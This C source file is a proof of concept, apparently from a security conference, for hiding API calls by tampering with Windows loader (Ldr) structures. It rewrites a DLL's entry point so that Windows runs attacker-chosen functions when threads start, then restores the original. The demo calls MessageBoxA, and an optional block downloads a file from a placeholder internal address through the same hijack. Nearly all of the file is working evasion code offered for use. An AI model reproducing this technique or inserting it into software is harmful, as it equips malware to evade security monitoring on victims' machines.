// PoC for stealthy execution via Ldr structures tampering
// 
// We edit the EntryPoint of a DLL in the Ldr structures so that when it is called by Windows, it executes what we want
// The function to execute and its arguments are first defined in a PDATA_T struct which holds all the information required,
// that is, all parameters, the return value, etc.
#include<windows.h>
#include <stdio.h>
#include "LdrProxy.h"
#include "pdatat.h"

// define HTTP if you want this PoC to perform the HTTP API calls after the MessageBoxA()
//#define HTTP
#ifdef HTTP
#include <WinInet.h>
#pragma comment (lib, "Wininet.lib")
#define URL "http://192.168.x.x:8089/test.txt"
#define BUFFER_SIZE 512
#endif

// Macro helpers
#define LdrShuffleExec(i)	((LDRSHUFFLEXEC_##i)pDataT->function)
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_00)(VOID);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_01)(ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_02)(ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_03)(ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_04)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_05)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_06)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_07)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_08)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_09)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* LDRSHUFFLEXEC_10)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
#define arg(i) pDataT->args[i]

// Helper to call our intended API in a new thread
// this is required for complex API calls which cannot run from threads being
// initialized or destroyed, for instance wininet or winhttp functions.
VOID RunInThread(PDATA_T pDataT) {
    DWORD dwArgsCount = pDataT->dwArgs;
    printf("\t\t[RunInThread][%d] - about to perform API call\n", GetCurrentThreadId());
    if (pDataT->dwArgs == 0) {
        pDataT->ret = LdrShuffleExec(00)();
    }

    if (pDataT->dwArgs == 1) {
        pDataT->ret = LdrShuffleExec(01)(arg(0));
    }

    if (pDataT->dwArgs == 2) {
        pDataT->ret = LdrShuffleExec(02)(arg(0), arg(1));
    }

    if (pDataT->dwArgs == 3) {
        pDataT->ret = LdrShuffleExec(03)(arg(0), arg(1), arg(2));
    }
    if (pDataT->dwArgs == 4) {
        pDataT->ret = LdrShuffleExec(04)(arg(0), arg(1), arg(2), arg(3));
    }
    if (pDataT->dwArgs == 5) {
        pDataT->ret = LdrShuffleExec(05)(arg(0), arg(1), arg(2), arg(3), arg(4));
    }
    if (pDataT->dwArgs == 6) {
        pDataT->ret = LdrShuffleExec(06)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5));
    }
    if (pDataT->dwArgs == 7) {
        pDataT->ret = LdrShuffleExec(07)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6));
    }
    if (pDataT->dwArgs == 8) {
        pDataT->ret = LdrShuffleExec(08)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7));
    }
    if (pDataT->dwArgs == 9) {
        pDataT->ret = LdrShuffleExec(09)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8));
    }
    if (pDataT->dwArgs == 10) {
        pDataT->ret = LdrShuffleExec(10)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8), arg(9));
    }
    SetEvent(pDataT->event);
}

// This is the code which will be invoked by Windows when it tries to execute the EntryPoint
// thinking it is the original DllMain()
VOID Runner(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    printf("\t[Runner][%d] - called on module 0x%p for reason %d\n", GetCurrentThreadId(), hinstDLL, fdwReason);

    ULONG_PTR uBackupValue = NULL;

    // fetch our DATA_T structure from the heap. It contains all the necessary arguments and parameters for the API call to perform
    PDATA_T pDataT = (PDATA_T)GetPdataT(hinstDLL);
    if (NULL == pDataT) {
        printf("\t[!][Runner][%d] - pDataT returned is NULL\n", GetCurrentThreadId());
        return;
    }
    uBackupValue = pDataT->bakEntryPoint; 

    // restore original entrypoint for the DLL
    if (!RestoreLdr((ULONG_PTR)hinstDLL)) {
        printf("\t[Runner][%d] - Failed!\n", GetCurrentThreadId());
    }

    // run InternetOpenW in a separate thread:
    DWORD dwThreadId = 0;
    if (pDataT->createThread) {
        CreateThread(NULL,4096,(LPTHREAD_START_ROUTINE)&RunInThread,(LPVOID)pDataT,0,&dwThreadId);
        printf("\t[Runner][%d] - API set to run in new thread, created thread %d\n", GetCurrentThreadId(), dwThreadId);
    }
    else {
        printf("\t[Runner][%d] - about to perform call in current thread\n", GetCurrentThreadId());
        // now run what we want
        DWORD dwArgsCount = pDataT->dwArgs;

        if (pDataT->dwArgs == 0) {
            pDataT->ret = LdrShuffleExec(00)();
        }

        if (pDataT->dwArgs == 1) {
            pDataT->ret = LdrShuffleExec(01)(arg(0));
        }

        if (pDataT->dwArgs == 2) {
            pDataT->ret = LdrShuffleExec(02)(arg(0), arg(1));
        }

        if (pDataT->dwArgs == 3) {
            pDataT->ret = LdrShuffleExec(03)(arg(0), arg(1), arg(2));
        }
        if (pDataT->dwArgs == 4) {
            pDataT->ret = LdrShuffleExec(04)(arg(0), arg(1), arg(2), arg(3));
        }
        if (pDataT->dwArgs == 5) {
            pDataT->ret = LdrShuffleExec(05)(arg(0), arg(1), arg(2), arg(3), arg(4));
        }
        if (pDataT->dwArgs == 6) {
            pDataT->ret = LdrShuffleExec(06)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5));
        }
        if (pDataT->dwArgs == 7) {
            pDataT->ret = LdrShuffleExec(07)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6));
        }
        if (pDataT->dwArgs == 8) {
            pDataT->ret = LdrShuffleExec(08)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7));
        }
        if (pDataT->dwArgs == 9) {
            pDataT->ret = LdrShuffleExec(09)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8));
        }
        if (pDataT->dwArgs == 10) {
            pDataT->ret = LdrShuffleExec(10)(arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8), arg(9));
        }
        // signal completion
        SetEvent(pDataT->event);
    }

    // perform the original initial call to the original DllMain() that we hijacked
    ((DLLMAIN)uBackupValue)(hinstDLL, fdwReason, lpvReserved);

        printf("\t[Runner][%d] - completed\n", GetCurrentThreadId());
}

// Dummy function to run when simulating a thread being created
// In a real payload, you would wait for a thread to be created/destructed
// as part of the normal process's lifestyle.
VOID DummyFn() {
    printf("\t[DummyFn] - thread %d\n", GetCurrentThreadId());
    Sleep(500);
    printf("\t[DummyFn] - the end %d\n", GetCurrentThreadId());
}

//
// ****************************************************************************************** //
// ************************************ [ MAIN ] ******************************************** //
// ****************************************************************************************** //
//
int main()
{
    /********** MessageBoxA() Poc *********/
    
    // Define the PDATA_T structure containing all the variables necessary for the API call to take place.
    PDATA_T pDataT = (PDATA_T)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DATA_T));

    // BEGIN - Execution setup: fill in the arguments, function to run, etc.
    pDataT->runner = (ULONG_PTR)Runner;
    pDataT->event = CreateEventA(NULL, FALSE, FALSE, "ExecEvt");
    // Prepare a call to MessageBoxA()
    pDataT->dwArgs = 4;
    pDataT->function = (ULONG_PTR)MessageBoxA;
    pDataT->args[0] = (ULONG_PTR)0;
    pDataT->args[1] = (ULONG_PTR)"Czesc x33fcon";
    pDataT->args[2] = (ULONG_PTR)"LDRSHUFFLE";
    pDataT->args[3] = (ULONG_PTR)MB_OKCANCEL;
   
    // Overwrite the _LDR_DATA_TABLE_ENTRY structure for this DLL.
    UpdateLdr(pDataT);
    // END - Execution setup
 
    // Simulate a new thread being created in this process.
    printf("[*] Press key to artificially create a new thread.\n");
    getchar();
    HANDLE hThread = CreateThread(NULL, 4096, (LPTHREAD_START_ROUTINE)DummyFn, NULL, 0, NULL);
    printf("[*] Created dummy thread to run DummyFn [%d]\n", GetThreadId(hThread));
    // Wait for the proper execution of our call to have been signaled.

    // sort this out for the createThread case!
    WaitForSingleObject(pDataT->event, INFINITE);
    printf("[*] Execution over, return code: %d (0x%p)\n", (int)pDataT->ret, (PVOID)pDataT->ret);

#ifdef HTTP
    // HTTP download PoC

    printf("[*] Now attempting to download file...\n");

    // InternetOpenW() call
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    PBYTE pBytes = NULL;
    DWORD dwBytesRead = NULL;

    // Define the PDATA_T structure containing all the variables necessary for the API call to take place.
    pDataT = (PDATA_T)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DATA_T));

    // BEGIN - Execution setup: fill in the arguments, function to run, etc.
    pDataT->runner = (ULONG_PTR)Runner;
    pDataT->event = CreateEventA(NULL, FALSE, FALSE, "ExecEvtHttp1");

    // Prepare a call to InternetOpenW()
    pDataT->dwArgs = 5;
    pDataT->function = (ULONG_PTR)InternetOpenW;
    pDataT->createThread = 1;           // wininet/winhttp API need to run in new threads
    pDataT->args[0] = (ULONG_PTR)NULL;
    pDataT->args[1] = (ULONG_PTR)NULL;
    pDataT->args[2] = (ULONG_PTR)NULL;
    pDataT->args[3] = (ULONG_PTR)NULL;
    pDataT->args[4] = (ULONG_PTR)NULL;

    // Overwrite the _LDR_DATA_TABLE_ENTRY structure for this DLL.
    UpdateLdr(pDataT);
    // END - Execution setup

    printf("[*] Press key to artificially create a new thread.\n");
    getchar();
    hThread = CreateThread(NULL, 4096, (LPTHREAD_START_ROUTINE)DummyFn, NULL, 0, NULL);
    printf("[*] Created dummy thread [%d]\n", GetThreadId(hThread));
    // Wait for the proper execution of our call to have been signaled.
    WaitForSingleObject(pDataT->event, INFINITE);
    printf("[*] InternetOpenW - Execution over, return code: %d (0x%p)\n", pDataT->ret, pDataT->ret);
    hInternet = (HINTERNET)pDataT->ret;

    /******************************/
    // InternetOpenUrlA
    
    // Define the PDATA_T structure containing all the variables necessary for the API call to take place.
    pDataT = (PDATA_T)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DATA_T));

    // BEGIN - Execution setup: fill in the arguments, function to run, etc.
    pDataT->runner = (ULONG_PTR)Runner;
    pDataT->event = CreateEventA(NULL, FALSE, FALSE, "ExecEvtHttp2");

    // Prepare a call to InternetOpenUrlA()
    pDataT->dwArgs = 6;
    pDataT->function = (ULONG_PTR)InternetOpenUrlA;
    pDataT->createThread = 1;           // wininet/winhttp API need to run in new threads
    pDataT->args[0] = (ULONG_PTR)hInternet;
    pDataT->args[1] = (ULONG_PTR)URL;
    pDataT->args[2] = (ULONG_PTR)NULL;
    pDataT->args[3] = (ULONG_PTR)NULL;
    pDataT->args[4] = (ULONG_PTR)INTERNET_FLAG_HYPERLINK;
    pDataT->args[5] = (ULONG_PTR)NULL;

    // Overwrite the _LDR_DATA_TABLE_ENTRY structure for this DLL.
    UpdateLdr(pDataT);

    printf("[*] Press key to artificially create a new thread.\n");
    getchar();
    hThread = CreateThread(NULL, 4096, (LPTHREAD_START_ROUTINE)DummyFn, NULL, 0, NULL);
    printf("[*] Created dummy thread [%d]\n", GetThreadId(hThread));
    // Wait for the proper execution of our call to have been signaled.
    WaitForSingleObject(pDataT->event, INFINITE);
    printf("[*] InternetOpenUrlA - Execution over, return code: %d (0x%p)\n", pDataT->ret, pDataT->ret);
    hInternetFile = (HINTERNET)pDataT->ret;

    pBytes = (PBYTE)LocalAlloc(LPTR, BUFFER_SIZE);
    if (!InternetReadFile(hInternetFile, pBytes, BUFFER_SIZE, &dwBytesRead)) {
        printf("[!] IRF: %d\n", GetLastError());
        return NULL;
    }
    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    printf("[*] Downloaded %d bytes:\n", dwBytesRead);
    for (int i = 0;i < dwBytesRead;i++) {
        printf("0x%02x ", pBytes[i]);
    }
    printf("\n\n");
#endif
    
    printf("<PRESS KEY TO EXIT>\n");
    getchar();
    return 0;
}
